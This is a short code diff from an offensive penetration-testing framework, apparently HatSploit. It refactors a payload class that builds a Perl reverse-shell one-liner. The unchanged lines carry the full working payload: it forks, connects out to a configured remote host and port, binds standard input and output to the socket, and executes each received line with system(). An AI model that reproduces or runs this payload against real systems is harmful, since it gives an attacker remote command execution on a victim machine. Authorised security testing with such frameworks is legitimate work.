@@ -26,9 +26,7 @@ class HatSploitPayload(Payload):
     def run(self):
         remote_host = self.handler['RHOST']
         remote_port = self.handler['RPORT']
-        remote_data = remote_host + ':' + remote_port
+        remote_data = f'{remote_host}:{remote_port}'
 
         payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"LOCAL_DATA\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
-        payload = payload.replace("LOCAL_DATA", remote_data)
-
-        return payload
+        return payload.replace("LOCAL_DATA", remote_data)
